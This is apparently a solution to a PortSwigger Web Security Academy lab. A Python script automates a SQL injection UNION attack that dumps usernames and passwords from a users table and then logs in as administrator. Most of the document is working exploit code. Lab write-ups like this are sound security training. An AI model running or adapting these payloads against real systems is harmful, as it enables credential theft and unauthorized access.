# SQL injection UNION attack, retrieving multiple values in a single column

> This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
The database contains a different table called `users`, with columns called `username` and `password`.
To solve the lab, perform a SQL injection UNION attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

```python
import requests
import sys
from bs4 import BeautifulSoup

# --- Configuration ---
BASE_URL = "https://0a7100ef037fed4c80a530ed00930097.web-security-academy.net"
PATH = "/filter"
LOGIN_PATH = "/login"

TARGET_URL = BASE_URL + PATH
LOGIN_URL = BASE_URL + LOGIN_PATH

def get_num_columns(url):
    for i in range(1, 50):
        nulls = ["NULL"] * i
        null_string = ", ".join(nulls)
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        response = requests.get(url, params=payload)
        if response.status_code == 200:
            print(f"[+] Column count: {i}")
            return i

def get_text_columns(url, num_cols):
    txt_cols = []
    for i in range(num_cols):
        nulls = ["NULL"] * num_cols
        nulls[i] = "'abc'"
        null_string = ", ".join(nulls)
        payload = {"category": f"' UNION SELECT {null_string} -- "}
        response = requests.get(url, params=payload)
        if response.status_code == 200:
            txt_cols.append(i)
    print(f"[+] Text columns: {txt_cols}")
    return txt_cols

def get_creds(url, num_cols, txt_idx):
    print("[*] Retrieving credentials...")
    nulls = ["NULL"] * num_cols
    # Concatenate: username || '~' || password
    nulls[txt_idx[0]] = "username || '~' || password"
    null_string = ", ".join(nulls)
    
    payload = {
        "category": f"' UNION SELECT {null_string} FROM users -- "
    }
    
    response = requests.get(url, params=payload)
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        
        # One-Liner:
        # Strictly look for a <td> or <th> tag that contains our flag "administrator~"
        creds_cell = soup.find(lambda t: t.name in ['td', 'th'] and "administrator~" in t.text)
        
        if creds_cell:
            # Split the text on '~' and grab the second part (the password)
            password = creds_cell.text.strip().split("~")[1]
            print(f"[+] Admin Password: {password}")
            return password

def login(url, admin_pw):
    if not admin_pw:
        print("[-] Login skipped (No password).")
        return
    
    print("[-] Logging in...")
    s = requests.Session()
    response = s.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    token = soup.find("input", {"name": "csrf"})['value']
    
    login_data = {
        "username": "administrator",
        "password": admin_pw,
        "csrf": token
    }
    
    response = s.post(url, data=login_data)
    if response.status_code == 200:
        print("[SUCCESS] LOGGED IN AS ADMINISTRATOR")

if __name__ == "__main__":
    column_num = get_num_columns(TARGET_URL)
    if column_num:
        txt_column = get_text_columns(TARGET_URL, column_num)
        if txt_column:
            admin_pw = get_creds(TARGET_URL, column_num, txt_column)
            login(LOGIN_URL, admin_pw)
```